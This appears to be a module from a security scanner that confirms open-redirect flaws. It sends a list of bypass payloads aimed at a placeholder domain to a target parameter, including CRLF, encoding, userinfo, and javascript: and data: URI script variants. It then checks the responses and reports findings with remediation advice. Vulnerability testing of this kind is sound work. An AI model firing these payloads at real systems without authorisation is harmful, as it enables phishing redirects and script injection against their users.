"""
RedTeef — Open redirect confirmation.

Confirm open redirect by verifying the server issues a redirect
to a controlled domain, with multiple bypass variants.

CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
"""

from __future__ import annotations

import logging
import re
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.redteef.open_redirect_confirmer")

# Controlled domain for redirect confirmation
_CANARY_DOMAIN = "evil.example.com"
_CANARY_URL = f"https://{_CANARY_DOMAIN}/"

# Open redirect payloads — various bypass techniques
_REDIRECT_PAYLOADS = [
    # Direct external URL
    {"label": "Direct HTTPS", "value": f"https://{_CANARY_DOMAIN}/"},
    {"label": "Direct HTTP", "value": f"http://{_CANARY_DOMAIN}/"},
    {"label": "Protocol-relative", "value": f"//{_CANARY_DOMAIN}/"},

    # Bypass: backslash instead of slash
    {"label": "Backslash bypass", "value": f"/\\{_CANARY_DOMAIN}"},
    {"label": "Double backslash", "value": f"\\\\{_CANARY_DOMAIN}"},

    # Bypass: @ in URL  (user:pass@host)
    {"label": "Userinfo bypass", "value": f"https://legit.com@{_CANARY_DOMAIN}/"},
    {"label": "Userinfo with creds", "value": f"https://admin:admin@{_CANARY_DOMAIN}/"},

    # Bypass: whitespace / tab / CRLF
    {"label": "Tab in URL", "value": f"https://{_CANARY_DOMAIN}/\t"},
    {"label": "Newline bypass", "value": f"https://{_CANARY_DOMAIN}/\n"},
    {"label": "CRLF bypass", "value": f"https://{_CANARY_DOMAIN}/\r\n"},

    # Bypass: URL encoding
    {"label": "URL-encoded", "value": f"https%3A%2F%2F{_CANARY_DOMAIN}%2F"},
    {"label": "Double-encoded", "value": f"https%253A%252F%252F{_CANARY_DOMAIN}%252F"},

    # Bypass: scheme tricks
    {"label": "javascript: URI", "value": f"javascript:document.location='{_CANARY_URL}'"},
    {"label": "data: URI redirect", "value": f"data:text/html,<script>location='{_CANARY_URL}'</script>"},

    # Bypass: subdomain of original
    {"label": "Subdomain bypass", "value": f"https://{_CANARY_DOMAIN}.legit.com/"},
    {"label": "Dotless bypass", "value": f"https://{_CANARY_DOMAIN}legit.com/"},

    # Bypass: path with domain
    {"label": "Path prefix bypass", "value": f"/{_CANARY_DOMAIN}"},
    {"label": "Double slash path", "value": f"//{_CANARY_DOMAIN}/%2f.."},

    # Bypass: mixed case
    {"label": "Case variation", "value": f"HTTPS://{_CANARY_DOMAIN.upper()}/"},
]

# Pattern to detect redirect to our canary domain
_REDIRECT_PATTERN = re.compile(
    rf"(location|redirect|url)\s*[:=]\s*['\"]?[^'\"]*{re.escape(_CANARY_DOMAIN)}",
    re.IGNORECASE,
)


class OpenRedirectConfirmer(HttpClientMixin):
    """
    Confirm open redirect by:
      1. Injecting redirect payloads into identified parameters
      2. Checking 3xx Location headers for canary domain
      3. Checking response body for redirect/meta-refresh to canary
      4. Testing multiple bypass variants
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        canary_domain: str = _CANARY_DOMAIN,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._canary_domain = canary_domain

    async def confirm(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Attempt to confirm open redirect on the target.

        Args:
            target: The target endpoint.
            inject_field: The parameter name to inject into.

        Returns:
            List of confirmed findings.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            for payload_spec in _REDIRECT_PAYLOADS:
                result = await self._try_payload(
                    client, target, inject_field, payload_spec,
                )
                if result:
                    findings.append(result)
                    break  # one confirmed finding is enough
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    async def _try_payload(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
        payload_spec: dict,
    ) -> Optional[Finding]:
        """Try a single redirect payload and check for canary in redirect."""
        field_name = inject_field or "url"
        method = target.method.upper() if target.method else "GET"

        try:
            if method == "GET":
                params = {field_name: payload_spec["value"]}
                resp = await client.request("GET", target.url, params=params)
            else:
                body = {field_name: payload_spec["value"]}
                resp = await client.request(method, target.url, json_body=body)

            confirmed = False
            evidence_detail = ""

            # Check 3xx redirect with Location header
            if 300 <= resp.status_code < 400:
                location = ""
                for key, val in (resp.headers or {}).items():
                    if key.lower() == "location":
                        location = val
                        break
                if self._canary_domain in location.lower():
                    confirmed = True
                    evidence_detail = f"Location header: {location}"

            # Check response body for redirect/meta-refresh
            if not confirmed and resp.status_code in (200, 201):
                if self._canary_domain in resp.text.lower():
                    confirmed = True
                    evidence_detail = "Canary domain found in response body"

            if confirmed:
                return Finding(
                    title=f"[CONFIRMED] Open redirect on {target.url}",
                    description=(
                        f"Open redirect confirmed using {payload_spec['label']}. "
                        f"The server redirects or references the attacker-controlled "
                        f"domain '{self._canary_domain}' in its response."
                    ),
                    severity=Severity.MEDIUM,
                    target=target,
                    evidence=(
                        f"Payload: {payload_spec['label']}\n"
                        f"Field: {field_name}\n"
                        f"Value: {payload_spec['value']}\n"
                        f"Status: {resp.status_code}\n"
                        f"{evidence_detail}"
                    ),
                    remediation=(
                        "Validate redirect URLs against an allowlist of trusted domains. "
                        "Use relative paths instead of full URLs for redirects. "
                        "If external redirects are needed, use an interstitial warning page."
                    ),
                    cwe=601,
                    tags=["confirmed", "open-redirect", "redteef"],
                )
        except (httpx.HTTPError, OSError, ValueError):
            pass

        return None
